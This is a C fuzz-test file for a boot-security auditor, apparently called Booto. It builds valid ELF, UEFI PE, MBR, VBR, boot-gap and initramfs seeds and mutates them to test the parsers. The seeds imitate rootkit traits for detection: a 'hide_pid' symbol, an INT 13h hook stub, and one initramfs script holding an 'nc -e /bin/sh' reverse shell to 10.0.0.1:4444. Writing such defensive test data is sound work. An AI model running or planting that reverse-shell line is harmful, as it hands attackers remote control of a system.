/**
 * @file test_fuzz.c
 * @brief Deterministic mutation fuzzer for Booto binary parsers.
 *
 * Every parser gets a VALID seed built in memory, so mutations reach deep paths
 * (section/symbol tables, PE sections, certificate table, CPIO entries). Each
 * iteration hands the parser an exactly-sized heap copy so ASan catches over-reads.
 */
#include "test_framework.h"
#include "elf_analyzer.h"
#include "uefi_analyzer.h"
#include "initramfs_auditor.h"
#include "mbr_auditor.h"
#include "logger.h"

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define FUZZ_ITERATIONS 1500
#define FUZZ_MAX_LEN    4096

typedef struct {
    size_t off;
    size_t len;
} fuzz_region_t;

typedef struct {
    const uint8_t *data;
    size_t len;
    const fuzz_region_t *hot; // header/table regions to weight mutations toward
    size_t nhot;
} fuzz_seed_t;

typedef void (*fuzz_target_fn)(const uint8_t *buf, size_t len);

/* ---- Deterministic PRNG (xorshift64) ---- */

static uint64_t g_rng;

static uint64_t rng_next(void) {
    uint64_t x = g_rng;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    g_rng = x;
    return x;
}

static size_t rng_below(size_t n) {
    return n ? (size_t)(rng_next() % n) : 0;
}

static void put_le(uint8_t *p, uint64_t v, size_t width) {
    for (size_t i = 0; i < width; i++) p[i] = (uint8_t)(v >> (8 * i));
}

/* ---- Mutation engine ---- */

static size_t pick_offset(size_t n, const fuzz_seed_t *s) {
    switch (rng_next() % 4) {
    case 0:
    case 1:
        return rng_below(n < 256 ? n : 256);
    case 2:
        if (s->nhot) {
            const fuzz_region_t *r = &s->hot[rng_below(s->nhot)];
            size_t off = r->off + rng_below(r->len);
            if (off < n) return off;
        }
        return rng_below(n);
    default:
        return rng_below(n);
    }
}

static uint64_t interesting_int(size_t n) {
    const uint64_t vals[] = {
        0, 1, UINT64_MAX, (uint64_t)INT32_MAX, (uint64_t)INT32_MAX + 1, (uint64_t)INT64_MAX,
        0xFFFF, (uint64_t)n - 1, (uint64_t)n, (uint64_t)n + 1, (uint64_t)n / 2, (uint64_t)n + 64,
    };
    return vals[rng_below(sizeof(vals) / sizeof(vals[0]))];
}

static void mutate(uint8_t *w, size_t *len, const fuzz_seed_t *s) {
    static const uint8_t interesting8[] = {0x00, 0xFF, 0x7F, 0x80};
    size_t n = *len;
    if (n == 0) return;

    switch (rng_next() % 7) {
    case 0: // bit flip
        w[pick_offset(n, s)] ^= (uint8_t)(1U << rng_below(8));
        break;
    case 1: // interesting byte
        w[pick_offset(n, s)] = interesting8[rng_below(sizeof(interesting8))];
        break;
    case 2:
    case 3:
    case 4: { // interesting 16/32/64-bit integer
        size_t width = (size_t)2 << rng_below(3);
        if (n < width) break;
        size_t off = pick_offset(n, s);
        if (off > n - width) off = n - width;
        put_le(w + off, interesting_int(n), width);
        break;
    }
    case 5: // truncation
        *len = rng_below(n + 1);
        break;
    default: { // splice a seed chunk at a random position (may grow the buffer)
        size_t src = rng_below(s->len);
        size_t chunk = 1 + rng_below(64);
        if (chunk > s->len - src) chunk = s->len - src;
        size_t dst = rng_below(n + 1);
        if (dst + chunk > FUZZ_MAX_LEN) chunk = FUZZ_MAX_LEN - dst;
        memcpy(w + dst, s->data + src, chunk);
        if (dst + chunk > n) *len = dst + chunk;
        break;
    }
    }
}

/* Returns false only on allocation failure. */
static bool fuzz_run(fuzz_target_fn target, const fuzz_seed_t *seeds, size_t nseeds, uint64_t rng_seed) {
    static uint8_t work[FUZZ_MAX_LEN];
    g_rng = rng_seed;

    for (size_t iter = 0; iter < FUZZ_ITERATIONS; iter++) {
        const fuzz_seed_t *s = &seeds[iter % nseeds];
        memcpy(work, s->data, s->len);
        size_t len = s->len;
        size_t rounds = 1 + rng_below(4);
        for (size_t r = 0; r < rounds; r++) mutate(work, &len, s);

        uint8_t *buf = malloc(len ? len : 1);
        if (!buf) return false;
        memcpy(buf, work, len);
        target(buf, len);
        free(buf);
    }
    return true;
}

/* ---- Seeds ---- */

/* ELF64 ET_REL: .shstrtab@0x40, .strtab@0x80, .modinfo@0xC0, .symtab@0x140, .text@0x1A0, shdrs@0x1C0. */
#define ELF_SHOFF 0x1C0
#define ELF_SHNUM 6

static void elf_shdr(uint8_t *b, size_t idx, uint32_t name, uint32_t type, uint64_t flags,
                     uint64_t off, uint64_t size, uint32_t link, uint32_t info, uint64_t entsize) {
    uint8_t *h = b + ELF_SHOFF + idx * 64;
    put_le(h + 0, name, 4);
    put_le(h + 4, type, 4);
    put_le(h + 8, flags, 8);
    put_le(h + 24, off, 8);
    put_le(h + 32, size, 8);
    put_le(h + 40, link, 4);
    put_le(h + 44, info, 4);
    put_le(h + 48, 1, 8);
    put_le(h + 56, entsize, 8);
}

static void elf_sym(uint8_t *b, size_t idx, uint32_t name, uint8_t st_info, uint16_t shndx, uint64_t value) {
    uint8_t *s = b + 0x140 + idx * 24;
    put_le(s + 0, name, 4);
    s[4] = st_info;
    put_le(s + 6, shndx, 2);
    put_le(s + 8, value, 8);
    put_le(s + 16, 8, 8);
}

static size_t build_elf(uint8_t *b) {
    static const char shstrtab[] = "\0.shstrtab\0.symtab\0.strtab\0.modinfo\0.text";
    static const char strtab[] = "\0sys_call_table\0init_module\0hide_pid";
    static const char modinfo[] = "license=GPL\0author=fuzz\0description=seed\0vermagic=6.1.0 SMP\0srcversion=ABC\0depends=";

    memset(b, 0, FUZZ_MAX_LEN);
    b[0] = 0x7F; b[1] = 'E'; b[2] = 'L'; b[3] = 'F';
    b[4] = 2; b[5] = 1; b[6] = 1;          // ELFCLASS64, LSB, EV_CURRENT
    put_le(b + 16, 1, 2);                  // ET_REL
    put_le(b + 18, 62, 2);                 // EM_X86_64
    put_le(b + 20, 1, 4);
    put_le(b + 40, ELF_SHOFF, 8);          // e_shoff
    put_le(b + 52, 64, 2);                 // e_ehsize
    put_le(b + 58, 64, 2);                 // e_shentsize
    put_le(b + 60, ELF_SHNUM, 2);
    put_le(b + 62, 1, 2);                  // e_shstrndx

    memcpy(b + 0x40, shstrtab, sizeof(shstrtab));
    memcpy(b + 0x80, strtab, sizeof(strtab));
    memcpy(b + 0xC0, modinfo, sizeof(modinfo));
    elf_sym(b, 1, 1, 0x11, 5, 0x1000);     // GLOBAL OBJECT sys_call_table
    elf_sym(b, 2, 16, 0x12, 5, 0x0);       // GLOBAL FUNC init_module
    elf_sym(b, 3, 28, 0x02, 5, 0x10);      // LOCAL FUNC hide_pid
    memset(b + 0x1A0, 0xC3, 0x20);

    elf_shdr(b, 1, 1, 3, 0, 0x40, sizeof(shstrtab), 0, 0, 0);       // .shstrtab
    elf_shdr(b, 2, 11, 2, 0, 0x140, 4 * 24, 3, 1, 24);              // .symtab
    elf_shdr(b, 3, 19, 3, 0, 0x80, sizeof(strtab), 0, 0, 0);        // .strtab
    elf_shdr(b, 4, 27, 1, 2, 0xC0, sizeof(modinfo), 0, 0, 0);       // .modinfo
    elf_shdr(b, 5, 36, 1, 6, 0x1A0, 0x20, 0, 0, 0);                 // .text
    return ELF_SHOFF + ELF_SHNUM * 64;
}

/* PE image: headers 0x200, .text@0x200 and .data@0x300 (0x100 each), WIN_CERTIFICATE@0x400 (0x80). */
static size_t build_pe(uint8_t *b, bool pe32_plus) {
    memset(b, 0, FUZZ_MAX_LEN);
    b[0] = 'M'; b[1] = 'Z'; b[0x3C] = 0x80;
    b[0x80] = 'P'; b[0x81] = 'E';
    size_t coff = 0x84, opt = coff + 20;
    put_le(b + coff, pe32_plus ? 0x8664 : 0x14C, 2);
    b[coff + 2] = 2;                                   // NumberOfSections
    b[coff + 16] = pe32_plus ? 0xF0 : 0xE0;            // SizeOfOptionalHeader
    b[opt] = 0x0b; b[opt + 1] = pe32_plus ? 0x02 : 0x01;
    put_le(b + opt + 16, 0x1000, 4);                   // AddressOfEntryPoint
    put_le(b + opt + 56, 0x3000, 4);                   // SizeOfImage
    put_le(b + opt + 60, 0x200, 4);                    // SizeOfHeaders
    put_le(b + opt + 64, 0x2211, 4);                   // CheckSum
    b[opt + 68] = 10;                                  // EFI application
    b[opt + (pe32_plus ? 108 : 92)] = 16;              // NumberOfRvaAndSizes
    size_t dir = opt + (pe32_plus ? 112 : 96) + 32;    // Security directory
    put_le(b + dir, 0x400, 4);
    put_le(b + dir + 4, 0x80, 4);

    size_t sect = opt + (pe32_plus ? 0xF0 : 0xE0);
    for (size_t i = 0; i < 2; i++) {
        uint8_t *e = b + sect + i * 40;
        memcpy(e, i ? ".data" : ".text", 5);
        put_le(e + 8, 0x100, 4);                       // VirtualSize
        put_le(e + 12, 0x1000 * (i + 1), 4);           // VirtualAddress
        put_le(e + 16, 0x100, 4);                      // SizeOfRawData
        put_le(e + 20, 0x200 + 0x100 * i, 4);          // PointerToRawData
    }
    for (size_t i = 0x200; i < 0x400; i++) b[i] = (uint8_t)i;

    put_le(b + 0x400, 0x80, 4);                        // dwLength
    put_le(b + 0x404, 0x0200, 2);                      // WIN_CERT_REVISION_2_0
    put_le(b + 0x406, 0x0002, 2);                      // WIN_CERT_TYPE_PKCS_SIGNED_DATA
    memset(b + 0x408, 0xC5, 0x78);
    return 0x480;
}

static size_t build_mbr(uint8_t *b) {
    memset(b, 0, FUZZ_MAX_LEN);
    b[0] = 0xEB; b[1] = 0x63; b[2] = 0x90;
    memcpy(b + 0x180, "GRUB \0Geom\0Hard Disk\0Read\0 Error", 32);
    put_le(b + 0x1B8, 0xDEADBEEF, 4);                  // disk signature
    uint8_t *p = b + 0x1BE;
    p[0] = 0x80; p[4] = 0x83;
    put_le(p + 8, 2048, 4);
    put_le(p + 12, 0x100000, 4);
    p += 16;
    p[4] = 0x07;
    put_le(p + 8, 0x100800, 4);
    put_le(p + 12, 0x200000, 4);
    b[510] = 0x55; b[511] = 0xAA;
    return 512;
}

static size_t build_vbr(uint8_t *b) {
    memset(b, 0, FUZZ_MAX_LEN);
    b[0] = 0xEB; b[1] = 0x52; b[2] = 0x90;
    memcpy(b + 3, "NTFS    ", 8);
    put_le(b + 11, 512, 2);                            // bytes per sector
    b[13] = 8;                                         // sectors per cluster
    b[21] = 0xF8;                                      // media descriptor
    put_le(b + 0x28, 0x1FFFFF, 8);                     // total sectors
    put_le(b + 0x30, 0xC0000, 8);                      // $MFT cluster
    memcpy(b + 0x54, "\xFA\x33\xC0\x8E\xD0\xBC\x00\x7C", 8);
    b[510] = 0x55; b[511] = 0xAA;
    return 512;
}

/* Four-sector post-MBR gap: INT 13h hook stub with real-mode stack setup so the code heuristic fires. */
static size_t build_gap(uint8_t *b) {
    static const uint8_t stub[] = { 0xFA, 0x31, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xFB,  /* cli; xor ax,ax; mov ss,ax; mov sp,7c00; sti */
                                    0xA3, 0x4C, 0x00, 0xCD, 0x13 };                        /* mov [004c],ax; int 13h */
    memset(b, 0, FUZZ_MAX_LEN);
    for (size_t sec = 0; sec < 4; sec++) {
        uint8_t *s = b + sec * 512;
        memcpy(s, stub, sizeof(stub));
        for (size_t i = sizeof(stub); i < 64; i++) s[i] = (uint8_t)(i * 7 + sec);
    }
    return 4 * 512;
}

static size_t cpio_entry(uint8_t *b, size_t off, const char *name, const char *data) {
    char hdr[111];
    size_t namesize = strlen(name) + 1, filesize = strlen(data);
    snprintf(hdr, sizeof(hdr), "070701%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X",
             1U, 0100755U, 0U, 0U, 1U, 0U, (unsigned)filesize, 0U, 0U, 0U, 0U, (unsigned)namesize, 0U);
    memcpy(b + off, hdr, 110);
    memcpy(b + off + 110, name, namesize);
    off = (off + 110 + namesize + 3) & ~(size_t)3;
    memcpy(b + off, data, filesize);
    return (off + filesize + 3) & ~(size_t)3;
}

static size_t build_cpio(uint8_t *b, fuzz_region_t *hot, size_t *nhot) {
    memset(b, 0, FUZZ_MAX_LEN);
    size_t off = 0;
    hot[0] = (fuzz_region_t){off, 110};
    off = cpio_entry(b, off, "init", "#!/bin/sh\nmount -t proc proc /proc\nexec /sbin/init\n");
    hot[1] = (fuzz_region_t){off, 110};
    off = cpio_entry(b, off, "scripts/local-top/net.sh", "#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n");
    hot[2] = (fuzz_region_t){off, 110};
    off = cpio_entry(b, off, "TRAILER!!!", "");
    *nhot = 3;
    return off;
}

/* ---- Targets ---- */

static void target_elf(const uint8_t *buf, size_t len) {
    elf_binary_info_t info;
    memset(&info, 0, sizeof(info));
    if (elf_parse_buffer(buf, len, &info) == BOOTO_OK) elf_free_info(&info);
}

static void target_pe(const uint8_t *buf, size_t len) {
    pe_efi_info_t info;
    (void)uefi_parse_pe_buffer(buf, len, &info);
}

static void target_mbr(const uint8_t *buf, size_t len) {
    mbr_scan_result_t res;
    memset(&res, 0, sizeof(res));
    (void)mbr_audit_buffer(buf, len, "/dev/fuzz_disk", &res);
}

static void target_vbr(const uint8_t *buf, size_t len) {
    mbr_scan_result_t res;
    memset(&res, 0, sizeof(res));
    (void)mbr_audit_vbr_buffer(buf, len, 2048, "/dev/fuzz_part", &res);
}

static void target_gap(const uint8_t *buf, size_t len) {
    mbr_scan_result_t res;
    memset(&res, 0, sizeof(res));
    (void)mbr_audit_gap_buffer(buf, len, 1, "/dev/fuzz_disk", &res);
}

static void target_initramfs(const uint8_t *buf, size_t len) {
    initramfs_scan_result_t res;
    (void)initramfs_audit_buffer(buf, len, &res);
}

/* ---- Tests: each asserts its seed parses deeply, then fuzzes it ---- */

static uint8_t g_seed_a[FUZZ_MAX_LEN];
static uint8_t g_seed_b[FUZZ_MAX_LEN];

static void test_fuzz_elf_parser(void) {
    TEST_START("test_fuzz_elf_parser");
    size_t len = build_elf(g_seed_a);
    static const fuzz_region_t hot[] = {{0x140, 4 * 24}, {ELF_SHOFF, ELF_SHNUM * 64}};

    elf_binary_info_t info;
    ASSERT_INT_EQ(elf_parse_buffer(g_seed_a, len, &info), BOOTO_OK, "ELF seed parses");
    bool deep = info.section_count == ELF_SHNUM && info.symbol_count == 4 && info.modinfo.has_modinfo &&
                strcmp(info.modinfo.license, "GPL") == 0 && elf_find_symbol(&info, "sys_call_table") != NULL;
    elf_free_info(&info);
    ASSERT_TRUE(deep, "ELF seed reaches section, symbol and modinfo tables");

    fuzz_seed_t seed = {g_seed_a, len, hot, 2};
    ASSERT_TRUE(fuzz_run(target_elf, &seed, 1, 0x9E3779B97F4A7C15ULL), "ELF fuzz run");
    TEST_PASS("test_fuzz_elf_parser");
}

static void test_fuzz_uefi_parser(void) {
    TEST_START("test_fuzz_uefi_parser");
    size_t len64 = build_pe(g_seed_a, true);
    size_t len32 = build_pe(g_seed_b, false);
    static const fuzz_region_t hot[] = {{0x80, 0x180}, {0x400, 0x80}};

    pe_efi_info_t info;
    ASSERT_INT_EQ(uefi_parse_pe_buffer(g_seed_a, len64, &info), BOOTO_OK, "PE32+ seed parses");
    ASSERT_TRUE(info.is_pe32_plus && info.has_authenticode, "PE32+ seed reaches cert table");
    ASSERT_INT_EQ(uefi_parse_pe_buffer(g_seed_b, len32, &info), BOOTO_OK, "PE32 seed parses");
    ASSERT_TRUE(!info.is_pe32_plus && info.has_authenticode, "PE32 seed reaches cert table");

    fuzz_seed_t seeds[] = {{g_seed_a, len64, hot, 2}, {g_seed_b, len32, hot, 2}};
    ASSERT_TRUE(fuzz_run(target_pe, seeds, 2, 0xD1B54A32D192ED03ULL), "PE fuzz run");
    TEST_PASS("test_fuzz_uefi_parser");
}

static void test_fuzz_mbr_auditor(void) {
    TEST_START("test_fuzz_mbr_auditor");
    size_t len = build_mbr(g_seed_a);
    static const fuzz_region_t hot[] = {{0x1B8, 0x48}};

    mbr_scan_result_t res;
    memset(&res, 0, sizeof(res));
    ASSERT_INT_EQ(mbr_audit_buffer(g_seed_a, len, "/dev/fuzz_disk", &res), BOOTO_OK, "MBR seed audits");
    ASSERT_INT_EQ(res.mbr_info.valid_partition_count, 2, "MBR seed partition table parsed");

    fuzz_seed_t seed = {g_seed_a, len, hot, 1};
    ASSERT_TRUE(fuzz_run(target_mbr, &seed, 1, 0x2545F4914F6CDD1DULL), "MBR fuzz run");
    TEST_PASS("test_fuzz_mbr_auditor");
}

static void test_fuzz_vbr_auditor(void) {
    TEST_START("test_fuzz_vbr_auditor");
    size_t len = build_vbr(g_seed_a);
    static const fuzz_region_t hot[] = {{0, 0x60}, {0x1F0, 0x10}};

    mbr_scan_result_t res;
    memset(&res, 0, sizeof(res));
    ASSERT_INT_EQ(mbr_audit_vbr_buffer(g_seed_a, len, 2048, "/dev/fuzz_part", &res), BOOTO_OK, "VBR seed audits");
    ASSERT_INT_EQ(res.vbr_scanned, 1, "VBR seed scanned");

    fuzz_seed_t seed = {g_seed_a, len, hot, 2};
    ASSERT_TRUE(fuzz_run(target_vbr, &seed, 1, 0x94D049BB133111EBULL), "VBR fuzz run");
    TEST_PASS("test_fuzz_vbr_auditor");
}

static void test_fuzz_gap_auditor(void) {
    TEST_START("test_fuzz_gap_auditor");
    size_t len = build_gap(g_seed_a);
    static const fuzz_region_t hot[] = {{0, 4}, {512, 4}, {1024, 4}, {1536, 4}};

    mbr_scan_result_t res;
    memset(&res, 0, sizeof(res));
    ASSERT_INT_EQ(mbr_audit_gap_buffer(g_seed_a, len, 1, "/dev/fuzz_disk", &res), BOOTO_OK, "Gap seed audits");
    ASSERT_TRUE(res.mbr_info.has_mbr_gap_payload, "Gap seed reaches opcode heuristics");

    fuzz_seed_t seed = {g_seed_a, len, hot, 4};
    ASSERT_TRUE(fuzz_run(target_gap, &seed, 1, 0xBF58476D1CE4E5B9ULL), "Gap fuzz run");
    TEST_PASS("test_fuzz_gap_auditor");
}

static void test_fuzz_initramfs_parser(void) {
    TEST_START("test_fuzz_initramfs_parser");
    fuzz_region_t hot[3];
    size_t nhot = 0;
    size_t len = build_cpio(g_seed_a, hot, &nhot);

    initramfs_scan_result_t res;
    ASSERT_INT_EQ(initramfs_audit_buffer(g_seed_a, len, &res), BOOTO_OK, "CPIO seed parses");
    ASSERT_INT_EQ(res.files_extracted, 2, "CPIO seed entries extracted");
    ASSERT_INT_EQ(res.scripts_audited, 2, "CPIO seed scripts audited");

    fuzz_seed_t seed = {g_seed_a, len, hot, nhot};
    ASSERT_TRUE(fuzz_run(target_initramfs, &seed, 1, 0x853C49E6748FEA9BULL), "Initramfs fuzz run");
    TEST_PASS("test_fuzz_initramfs_parser");
}

int main(void) {
    logger_init(LOG_LEVEL_CRITICAL, NULL); // parsers log per call; keep 9k iterations quiet and fast
    printf("\n--- Running Deterministic Parser Mutation Fuzzer (%d iterations/parser) ---\n", FUZZ_ITERATIONS);
    test_fuzz_elf_parser();
    test_fuzz_uefi_parser();
    test_fuzz_mbr_auditor();
    test_fuzz_vbr_auditor();
    test_fuzz_gap_auditor();
    test_fuzz_initramfs_parser();
    TEST_SUMMARY();
    return 0;
}
